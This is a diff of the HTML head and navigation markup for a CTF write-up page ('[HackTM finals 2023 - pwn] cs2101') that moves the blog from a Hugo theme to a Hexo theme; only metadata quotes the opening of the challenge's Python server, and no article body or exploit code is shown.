@@ -1,1044 +1,502 @@
 <!DOCTYPE html>
-<html
-  itemscope
-  itemtype="http://schema.org/WebPage"
-  lang="en"
-  class="color-toggle-hidden"
->
-  <head>
-    <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
 
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[HackTM finals 2023 - pwn] cs2101 | repr</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="cs2101cs2101 is shellcoding &#x2F; unicorn sandbox escape challenge I did during the HackTM finals. What we haveThe challenge is splitted into three file: the server, the unicorn callback based checke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HackTM finals 2023 - pwn] cs2101">
+<meta property="og:url" content="https://n4sm.github.io/posts/cs2101/index.html">
+<meta property="og:site_name" content="repr">
+<meta property="og:description" content="cs2101cs2101 is shellcoding &#x2F; unicorn sandbox escape challenge I did during the HackTM finals. What we haveThe challenge is splitted into three file: the server, the unicorn callback based checke">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-14T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-01T09:23:35.607Z">
+<meta property="article:author" content="nasm">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nasm">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="emulator">
+<meta property="article:tag" content="hacktm">
+<meta property="article:tag" content="cs2101">
+<meta property="article:tag" content="shellcoding">
+<meta property="article:tag" content="unicorn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+<meta name="generator" content="Hexo 6.3.0"></head>
 
-
-
-  <meta name="description" content="cs2101     cs2101 is shellcoding / unicorn sandbox escape challenge I did during the HackTM finals.
-What we have     The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let&rsquo;s take a look at the server:
-#!/usr/bin/env python3 import os import sys import base64 import tempfile from sc_filter import emulate def main(): encoded = input(&#34;Enter your base64 encoded shellcode:\n&#34;) encoded&#43;= &#39;=======&#39; try: shellcode = base64." />
-
-
-  <meta name="keywords" content="pwn,binary exploitation,cryptography,Reverse engineering,hypervisor" />
-
-
+<body>
   
   
     
-      
-      
+<div id="banner" class="">
+  <img src="/pic/wall.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>repr </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
     
-  
-
-  
-    <meta name="author" content="nasm" />
-  
-
-
-    <title>
-      
-        [HackTM finals 2023 - pwn] cs2101 | 
-      repr
-    </title>
-
-    <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" />
-<link
-  rel="icon"
-  type="image/png"
-  sizes="48x48"
-  href="/favicon/favicon-32x32.png"
-/>
-<link
-  rel="icon"
-  type="image/png"
-  sizes="32x32"
-  href="/favicon/favicon-32x32.png"
-/>
-<link
-  rel="icon"
-  type="image/png"
-  sizes="16x16"
-  href="/favicon/favicon-16x16.png"
-/>
-
+      <a class="main-nav-link" href="/">Home</a>
     
-
-    <meta property="og:title" content="[HackTM finals 2023 - pwn] cs2101" />
-<meta
-  property="og:description"
-  content="
+      <a class="main-nav-link" href="/archives">Archives</a>
     
-      cs2101     cs2101 is shellcoding / unicorn sandbox escape challenge I did during the HackTM finals.
-What we have     The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let&rsquo;s take a look at the server:
-#!/usr/bin/env python3 import os import sys import base64 import tempfile from sc_filter import emulate def main(): encoded = input(&#34;Enter your base64 encoded shellcode:\n&#34;) encoded&#43;= &#39;=======&#39; try: shellcode = base64.
+      <a class="main-nav-link" href="/about">About</a>
     
-  "
-/>
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://nasm.re/posts/cs2101/" />
-      <meta property="og:image" content="https://nasm.re/risa.png" />
-    <meta property="article:section" content="posts" />
-  
-    <meta
-      property="article:published_time"
-      content="2023-05-15T00:00:00+00:00"
-    />
-  
-  
-    <meta
-      property="article:modified_time"
-      content="2023-05-15T00:00:00+00:00"
-    />
-  
-
-<meta name="twitter:card" content="summary_large_image" />
-      <meta name="twitter:image" content="https://nasm.re/risa.png" />
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
     
-<meta name="twitter:title" content="[HackTM finals 2023 - pwn] cs2101" />
-<meta
-  name="twitter:description"
-  content="
-    
-      cs2101     cs2101 is shellcoding / unicorn sandbox escape challenge I did during the HackTM finals.
-What we have     The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let&rsquo;s take a look at the server:
-#!/usr/bin/env python3 import os import sys import base64 import tempfile from sc_filter import emulate def main(): encoded = input(&#34;Enter your base64 encoded shellcode:\n&#34;) encoded&#43;= &#39;=======&#39; try: shellcode = base64.
-    
-  "
-/>
-
-
-    <script src="/js/main-b22ac364.bundle.min.js"></script>
-
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/Metropolis.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/LiberationSans.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/GeekblogIcons.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-
-<link
-  rel="preload"
-  href="/main-2857a4bc.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/main-2857a4bc.min.css"
-  media="all"
-/>
-
-<link
-  rel="preload"
-  href="/mobile-3888ed2b.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/mobile-3888ed2b.min.css"
-  media="screen and (max-width: 45rem)"
-/>
-
-<link
-  rel="preload"
-  href="/print-8a905a2e.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/print-8a905a2e.min.css"
-  media="print"
-/>
-
-<link
-  rel="preload"
-  href="/custom.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/custom.css"
-  media="all"
-/>
-
-
-
-
-
-<!-- Made with Geekblog theme https://github.com/thegeeklab/hugo-geekblog -->
-
-    
-
-
-
-
-<script type="application/ld+json">
-{
-    "@context": "http://schema.org",
-    "@type": "BlogPosting",
-    "articleSection": "posts",
-    "name": "[HackTM finals 2023 - pwn] cs2101",
-    "headline": "[HackTM finals 2023 - pwn] cs2101",
-    "alternativeHeadline": "",
-    "description": "cs2101     cs2101 is shellcoding \/ unicorn sandbox escape challenge I did during the HackTM finals.\nWhat we have     The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let\u0026rsquo;s take a look at the server:\n#!\/usr\/bin\/env python3 import os import sys import base64 import tempfile from sc_filter import emulate def main(): encoded = input(\u0026#34;Enter your base64 encoded shellcode:\\n\u0026#34;) encoded\u002b= \u0026#39;=======\u0026#39; try: shellcode = base64.",
-    "inLanguage": "en",
-    "isFamilyFriendly": "true",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "https:\/\/nasm.re\/posts\/cs2101\/"
-    },
-    "author" : [
-        {
-            "@type": "Person",
-            "name": "nasm"
-        }
-    ],
-    "copyrightHolder" : "repr",
-    "copyrightYear" : "2023",
-    "dateCreated": "2023-05-15T00:00:00.00Z",
-    "datePublished": "2023-05-15T00:00:00.00Z",
-    "dateModified": "2023-05-15T00:00:00.00Z",
-    "publisher":{
-        "@type":"Organization",
-        "name": "repr",
-        "url": "https://nasm.re",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "https:\/\/nasm.re\/risa.png",
-            "width":"32",
-            "height":"32"
-        }
-    },
-    "url" : "https:\/\/nasm.re\/posts\/cs2101\/",
-    "wordCount" : "1147",
-    "genre" : [ "ctf" , "nasm" , "pwn" , "linux" , "hacktm" , "cs2101" , "emulator" , "shellcoding" , "unicorn" ]
-}
-</script>
-
-
-    
-
-  </head>
-
-  <body>
-    
-  <!-- geekblog include: sprites/geekblog.svg -->
-  <svg class="svg-sprite" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_back" xmlns="http://www.w3.org/2000/svg"><path d="M31.999 14.035v3.93H7.673l11.134 11.228L16 32 .001 16.001 16 .002l2.807 2.807L7.673 14.037h24.326z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M7.954 17.965v5.988L.001 16l7.953-7.953v5.988H32v3.93H7.954z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M24.046 14.035V8.047L31.999 16l-7.953 7.953v-5.988H0v-3.93h24.046z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_bitbucket" xmlns="http://www.w3.org/2000/svg"><path d="M15.905 13.355c.189 1.444-1.564 2.578-2.784 1.839-1.375-.602-1.375-2.784-.034-3.403 1.151-.705 2.818.223 2.818 1.564zm1.907-.361c-.309-2.44-3.076-4.056-5.328-3.042-1.426.636-2.389 2.148-2.32 3.747.086 2.097 2.08 3.815 4.176 3.626s3.729-2.234 3.472-4.331zm4.108-9.315c-.756-.997-2.045-1.169-3.179-1.358-3.214-.516-6.513-.533-9.727.034-1.066.172-2.269.361-2.939 1.323 1.1 1.031 2.664 1.186 4.073 1.358 2.544.327 5.156.344 7.699.017 1.426-.172 3.008-.309 4.073-1.375zm.979 17.788c-.481 1.684-.206 3.953-1.994 4.932-3.076 1.701-6.806 1.89-10.191 1.289-1.787-.327-3.884-.894-4.864-2.578-.43-1.65-.705-3.334-.98-5.018l.103-.275.309-.155c5.121 3.386 12.288 3.386 17.427 0 .808.241.206 1.22.189 1.805zM26.01 4.951c-.584 3.764-1.255 7.51-1.908 11.257-.189 1.1-1.255 1.719-2.148 2.183-3.214 1.615-6.96 1.89-10.483 1.512-2.389-.258-4.829-.894-6.771-2.389-.911-.705-.911-1.908-1.083-2.922-.602-3.523-1.289-7.046-1.719-10.604.206-1.547 1.942-2.217 3.231-2.698C6.848.654 8.686.362 10.508.19c3.884-.378 7.854-.241 11.618.859 1.341.395 2.784.945 3.695 2.097.412.533.275 1.203.189 1.805z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_bookmark" xmlns="http://www.w3.org/2000/svg"><path d="M20.357 5.856q1.157 0 2.043.851t.885 2.008v23.284l-10.212-4.357-10.144 4.357V8.715q0-1.157.885-2.008t2.042-.851h14.502zm5.787 18.859V5.856q0-1.157-.851-2.042t-2.008-.885H8.715q0-1.157.885-2.042t2.043-.885h14.502q1.157 0 2.043.885t.885 2.042v23.216z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_auto" xmlns="http://www.w3.org/2000/svg"><path d="M16.846 18.938h2.382L15.22 7.785h-2.44L8.772 18.938h2.382l.871-2.44h3.95zm7.087-9.062L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809zm-11.385 4.937L14 10.282l1.452 4.531h-2.904z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_dark" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565q-1.51 0-3.079.697 1.917.871 3.108 2.701T15.22 14t-1.191 4.037-3.108 2.701q1.568.697 3.079.697zm9.933-11.559L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_light" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565 8.743 8.743 6.565 14t2.178 5.257T14 21.435zm9.933-3.311v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809L27.999 14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_check" xmlns="http://www.w3.org/2000/svg"><path d="M8.885 20.197L25.759 3.323l2.24 2.24L8.885 24.677 0 15.792l2.24-2.24z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_clear" xmlns="http://www.w3.org/2000/svg"><path d="M32 3.222L19.222 16 32 28.778l-3.221 3.221-12.778-12.778L3.223 31.999.002 28.778 12.78 16 .002 3.222 3.223.001l12.778 12.778L28.779.001z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_cloud_off" xmlns="http://www.w3.org/2000/svg"><path d="M9.023 10.5H7q-1.914 0-3.281 1.395t-1.367 3.309 1.367 3.281T7 19.852h11.375zM3.5 4.976l1.477-1.477L24.5 23.022l-1.477 1.477-2.352-2.297H6.999q-2.898 0-4.949-2.051t-2.051-4.949q0-2.844 1.969-4.867t4.758-2.133zm19.086 5.578q2.242.164 3.828 1.832T28 16.351q0 3.008-2.461 4.758l-1.695-1.695q1.805-.984 1.805-3.063 0-1.422-1.039-2.461t-2.461-1.039h-1.75v-.602q0-2.68-1.859-4.539t-4.539-1.859q-1.531 0-2.953.711l-1.75-1.695Q11.431 3.5 14.001 3.5q2.953 0 5.496 2.078t3.09 4.977z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_code" xmlns="http://www.w3.org/2000/svg"><path d="M9.917 24.5a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm0-21a1.75 1.75 0 10-3.501.001A1.75 1.75 0 009.917 3.5zm11.666 2.333a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm1.75 0a3.502 3.502 0 01-1.75 3.026c-.055 6.581-4.721 8.039-7.82 9.023-2.898.911-3.846 1.349-3.846 3.117v.474a3.502 3.502 0 011.75 3.026c0 1.932-1.568 3.5-3.5 3.5s-3.5-1.568-3.5-3.5c0-1.294.711-2.424 1.75-3.026V6.526A3.502 3.502 0 014.667 3.5c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5a3.502 3.502 0 01-1.75 3.026v9.06c.93-.456 1.914-.766 2.807-1.039 3.391-1.075 5.323-1.878 5.359-5.687a3.502 3.502 0 01-1.75-3.026c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_contacts" xmlns="http://www.w3.org/2000/svg"><path d="M22.688 22.688v-2q0-1.5-2.281-2.438t-4.406-.938-4.406.938-2.281 2.438v2h13.375zM16 9q-1.25 0-2.125.875T13 12t.875 2.125T16 15t2.125-.875T19 12t-.875-2.125T16 9zm10.688-3.687q1.063 0 1.844.813t.781 1.875v16q0 1.063-.781 1.875t-1.844.813H5.313q-1.063 0-1.844-.813t-.781-1.875v-16q0-1.063.781-1.875t1.844-.813h21.375zM5.313 32v-2.688h21.375V32H5.313zM26.688 0v2.688H5.313V0h21.375z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_copy" xmlns="http://www.w3.org/2000/svg"><path d="M23.502 25.438V7.626H9.562v17.812h13.94zm0-20.315q1.013 0 1.787.745t.774 1.757v17.812q0 1.013-.774 1.787t-1.787.774H9.562q-1.013 0-1.787-.774t-.774-1.787V7.625q0-1.013.774-1.757t1.787-.745h13.94zM19.689 0v2.562H4.438v17.812H1.936V2.562q0-1.013.745-1.787T4.438.001h15.251z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_create" xmlns="http://www.w3.org/2000/svg"><path d="M31.499 7.167l-3.25 3.25-6.666-6.666 3.25-3.25q.5-.5 1.25-.5t1.25.5l4.166 4.166q.5.5.5 1.25t-.5 1.25zM.001 25.333L19.667 5.667l6.666 6.666L6.667 31.999H.001v-6.666z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_date" xmlns="http://www.w3.org/2000/svg"><path d="M27.192 28.844V11.192H4.808v17.652h22.384zm0-25.689q1.277 0 2.253.976t.976 2.253v22.459q0 1.277-.976 2.216t-2.253.939H4.808q-1.352 0-2.291-.901t-.939-2.253V6.385q0-1.277.939-2.253t2.291-.976h1.577V.001h3.23v3.155h12.769V.001h3.23v3.155h1.577zm-3.155 11.267v3.155h-3.23v-3.155h3.23zm-6.46 0v3.155h-3.155v-3.155h3.155zm-6.384 0v3.155h-3.23v-3.155h3.23z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_download" xmlns="http://www.w3.org/2000/svg"><path d="M2.866 28.209h26.269v3.79H2.866v-3.79zm26.268-16.925L16 24.418 2.866 11.284h7.493V.001h11.283v11.283h7.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_email" xmlns="http://www.w3.org/2000/svg"><path d="M28.845 9.615v-3.23L16 14.422 3.155 6.385v3.23L16 17.577zm0-6.46q1.277 0 2.216.977T32 6.385v19.23q0 1.277-.939 2.253t-2.216.977H3.155q-1.277 0-2.216-.977T0 25.615V6.385q0-1.277.939-2.253t2.216-.977h25.69z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_git" xmlns="http://www.w3.org/2000/svg"><path d="M27.472 12.753L15.247.529a1.803 1.803 0 00-2.55 0l-2.84 2.84 2.137 2.137a2.625 2.625 0 013.501 3.501l3.499 3.499a2.625 2.625 0 11-1.237 1.237l-3.499-3.499c-.083.04-.169.075-.257.106v7.3a2.626 2.626 0 11-1.75 0v-7.3a2.626 2.626 0 01-1.494-3.607L8.62 4.606l-8.09 8.09a1.805 1.805 0 000 2.551l12.225 12.224a1.803 1.803 0 002.55 0l12.168-12.168a1.805 1.805 0 000-2.551z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_github" xmlns="http://www.w3.org/2000/svg"><path d="M16 .394c8.833 0 15.999 7.166 15.999 15.999 0 7.062-4.583 13.062-10.937 15.187-.813.146-1.104-.354-1.104-.771 0-.521.021-2.25.021-4.396 0-1.5-.5-2.458-1.083-2.958 3.562-.396 7.312-1.75 7.312-7.896 0-1.75-.625-3.167-1.646-4.291.167-.417.708-2.042-.167-4.25-1.333-.417-4.396 1.646-4.396 1.646a15.032 15.032 0 00-8 0S8.937 6.602 7.603 7.018c-.875 2.208-.333 3.833-.167 4.25-1.021 1.125-1.646 2.542-1.646 4.291 0 6.125 3.729 7.5 7.291 7.896-.458.417-.875 1.125-1.021 2.146-.917.417-3.25 1.125-4.646-1.333-.875-1.521-2.458-1.646-2.458-1.646-1.562-.021-.104.979-.104.979 1.042.479 1.771 2.333 1.771 2.333.938 2.854 5.396 1.896 5.396 1.896 0 1.333.021 2.583.021 2.979 0 .417-.292.917-1.104.771C4.582 29.455-.001 23.455-.001 16.393-.001 7.56 7.165.394 15.998.394zM6.063 23.372c.042-.083-.021-.187-.146-.25-.125-.042-.229-.021-.271.042-.042.083.021.187.146.25.104.062.229.042.271-.042zm.646.709c.083-.062.062-.208-.042-.333-.104-.104-.25-.146-.333-.062-.083.062-.062.208.042.333.104.104.25.146.333.062zm.625.937c.104-.083.104-.25 0-.396-.083-.146-.25-.208-.354-.125-.104.062-.104.229 0 .375s.271.208.354.146zm.875.875c.083-.083.042-.271-.083-.396-.146-.146-.333-.167-.417-.062-.104.083-.062.271.083.396.146.146.333.167.417.062zm1.187.521c.042-.125-.083-.271-.271-.333-.167-.042-.354.021-.396.146s.083.271.271.312c.167.062.354 0 .396-.125zm1.313.104c0-.146-.167-.25-.354-.229-.187 0-.333.104-.333.229 0 .146.146.25.354.229.187 0 .333-.104.333-.229zm1.208-.208c-.021-.125-.187-.208-.375-.187-.187.042-.312.167-.292.312.021.125.187.208.375.167s.312-.167.292-.292z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_gitlab" xmlns="http://www.w3.org/2000/svg"><path d="M1.629 11.034L14 26.888.442 17.048a1.09 1.09 0 01-.39-1.203l1.578-4.811zm7.217 0h10.309l-5.154 15.854zM5.753 1.475l3.093 9.559H1.63l3.093-9.559a.548.548 0 011.031 0zm20.618 9.559l1.578 4.811c.141.437-.016.922-.39 1.203l-13.558 9.84 12.371-15.854zm0 0h-7.216l3.093-9.559a.548.548 0 011.031 0z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_heart" xmlns="http://www.w3.org/2000/svg"><path d="M16 29.714a1.11 1.11 0 01-.786-.321L4.072 18.643c-.143-.125-4.071-3.714-4.071-8 0-5.232 3.196-8.357 8.535-8.357 3.125 0 6.053 2.464 7.464 3.857 1.411-1.393 4.339-3.857 7.464-3.857 5.339 0 8.535 3.125 8.535 8.357 0 4.286-3.928 7.875-4.089 8.035L16.785 29.392c-.214.214-.5.321-.786.321z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M25.875 28.25L22.125 32 6.126 16.001 22.125.002l3.75 3.75-12.25 12.25z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M6.125 28.25L18.375 16 6.125 3.75 9.875 0l15.999 15.999L9.875 31.998z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_down" xmlns="http://www.w3.org/2000/svg"><path d="M3.281 5.36L14 16.079 24.719 5.36 28 8.641l-14 14-14-14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_up" xmlns="http://www.w3.org/2000/svg"><path d="M24.719 22.64L14 11.921 3.281 22.64 0 19.359l14-14 14 14z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_link" xmlns="http://www.w3.org/2000/svg"><path d="M24.037 7.963q3.305 0 5.634 2.366T32 16t-2.329 5.671-5.634 2.366h-6.46v-3.08h6.46q2.028 0 3.493-1.465t1.465-3.493-1.465-3.493-3.493-1.465h-6.46v-3.08h6.46zM9.615 17.578v-3.155h12.77v3.155H9.615zM3.005 16q0 2.028 1.465 3.493t3.493 1.465h6.46v3.08h-6.46q-3.305 0-5.634-2.366T0 16.001t2.329-5.671 5.634-2.366h6.46v3.08h-6.46q-2.028 0-3.493 1.465t-1.465 3.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_menu" xmlns="http://www.w3.org/2000/svg"><path d="M.001 5.334h31.998v3.583H.001V5.334zm0 12.416v-3.5h31.998v3.5H.001zm0 8.916v-3.583h31.998v3.583H.001z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_notifications" xmlns="http://www.w3.org/2000/svg"><path d="M25.846 22.154l3.308 3.308v1.615H2.847v-1.615l3.308-3.308V14q0-3.846 1.961-6.692t5.423-3.692V2.462q0-1 .692-1.731T16 0t1.769.731.692 1.731v1.154q3.461.846 5.423 3.692T25.846 14v8.154zM16 32q-1.385 0-2.346-.923t-.962-2.308h6.615q0 1.308-1 2.269T15.999 32z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_person" xmlns="http://www.w3.org/2000/svg"><path d="M16 20.023q5.052 0 10.526 2.199t5.473 5.754v4.023H0v-4.023q0-3.555 5.473-5.754t10.526-2.199zM16 16q-3.275 0-5.614-2.339T8.047 8.047t2.339-5.661T16 0t5.614 2.386 2.339 5.661-2.339 5.614T16 16z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_pin" xmlns="http://www.w3.org/2000/svg"><path d="M17.6 19.2h9.6v-1.6L22.4 16V3.2l4.8-1.6V0H4.8v1.6l4.8 1.6V16l-4.8 1.6v1.6h9.6v11.2L16 32l1.6-1.6V19.2z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_rss_feed" xmlns="http://www.w3.org/2000/svg"><path d="M-.481 12.048q8.482 0 14.457 5.976t5.976 14.457h-5.879q0-5.976-4.289-10.264T-.48 17.928v-5.879zm0-11.565q13.204 0 22.601 9.397t9.397 22.601h-5.783q0-10.891-7.662-18.553T-.481 6.266V.483zm0 27.468q0-1.831 1.301-3.132t3.229-1.301 3.181 1.253 1.253 3.181-1.301 3.229-3.132 1.301q-1.928 0-3.229-1.301T-.48 27.952z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_search" xmlns="http://www.w3.org/2000/svg"><path d="M11.925 20.161q3.432 0 5.834-2.402t2.402-5.834-2.402-5.834-5.834-2.402-5.834 2.402-2.402 5.834 2.402 5.834 5.834 2.402zm10.981 0L32 29.255 29.255 32l-9.094-9.094v-1.458l-.515-.515q-3.26 2.831-7.721 2.831-4.976 0-8.45-3.432T.001 11.925t3.474-8.45 8.45-3.474 8.407 3.474 3.432 8.45q0 1.802-.858 4.075t-1.973 3.646l.515.515h1.458z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_security" xmlns="http://www.w3.org/2000/svg"><path d="M16 0l13.072 5.855v8.715q0 6.059-3.745 11.063T16 31.999q-5.583-1.362-9.327-6.366T2.928 14.57V5.855zm0 16v13.004q4.017-1.294 6.808-4.868T26.144 16H16zm0 0V3.2L5.856 7.693v8.306H16z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_star" xmlns="http://www.w3.org/2000/svg"><path d="M14 22.052L5.324 27.31l2.3-9.859L0 10.813l10.056-.854L14 .692l3.944 9.267L28 10.813l-7.624 6.638 2.3 9.859z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_tag" xmlns="http://www.w3.org/2000/svg"><path d="M17.52 17.52v-7.041h-7.041v7.041h7.041zM28 10.479h-7.041v7.041H28v3.439h-7.041V28H17.52v-7.041h-7.041V28H7.04v-7.041H-.001V17.52H7.04v-7.041H-.001V7.04H7.04V-.001h3.439V7.04h7.041V-.001h3.439V7.04H28v3.439z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_timer" xmlns="http://www.w3.org/2000/svg"><path d="M16 29q4.428 0 7.536-3.143t3.107-7.571-3.107-7.536T16 7.643 8.464 10.75t-3.107 7.536 3.107 7.571T16 29zM26.714 9.786q1.214 1.571 2.107 4.036t.893 4.464q0 5.643-4 9.678T16 32t-9.714-4.036-4-9.678 4-9.678T16 4.572q1.929 0 4.464.929t4.107 2.143l2.143-2.214q1.143.929 2.143 2.143zM14.5 19.857v-9.143h3v9.143h-3zM20.571.001v3.071h-9.143V.001h9.143z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_tree" xmlns="http://www.w3.org/2000/svg"><path d="M32 14.423H20.808V9.616h-3.23v12.77h3.23v-4.807H32v12.845H20.808v-4.807h-6.385v-16h-3.23v4.807H.001V1.579h11.192v4.807h9.615V1.579H32v12.845z"/></svg></defs></svg>
-
-
-
-
-    <div
-      class="wrapper dark-mode-dim"
-    >
-      <header class="gblog-header">
-  <div class="container flex flex-wrap">
-    <div class="gblog-header__col-1 flex justify-start hidden-mobile"></div>
-    <div class="gblog-header__col-2 flex align-center justify-center ">
-      <a class="gblog-header__link" rel="me" href="https://nasm.re">
-        <span class="gblog-brand flex align-center justify-center">
-          <img
-            class="gblog-brand__img"
-            src="/risa.png"
-            alt=""
-          />
-          <span class="gblog-brand__title">repr</span>
-        </span>
-        
-          <span class="gblog-brand__subtitle flex align-center justify-center">pwn, RE, crypto stuff</span>
-        
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
       </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
     </div>
-    <div class="gblog-header__col-3 flex justify-end">
